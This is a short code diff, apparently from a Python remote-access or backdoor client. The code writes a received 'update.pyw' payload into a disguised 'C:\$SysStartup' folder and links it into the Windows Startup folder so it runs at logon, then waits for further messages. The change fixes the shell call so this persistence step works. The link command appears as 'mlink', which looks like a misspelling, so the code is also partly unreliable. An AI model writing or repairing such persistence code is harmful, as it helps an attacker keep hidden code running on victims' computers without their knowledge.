@@ -99,7 +99,7 @@ def process(message):
         with open("update.pyw", "w") as updateFile:
             updateFile.write(var)
         call(["move", "update.pyw", "C:\\$SysStartup"], shell=True)
-        call(["cd", f"\"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"", "&&", "mlink", "update.pyw", "C:\\$SysStartup\\update.pyw"])
+        call(["cd", f"\"C:\\Users\\{getlogin()}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\\"", "&&", "mlink", "update.pyw", "C:\\$SysStartup\\update.pyw"], shell=True)
         recvMsg()
 
     else:
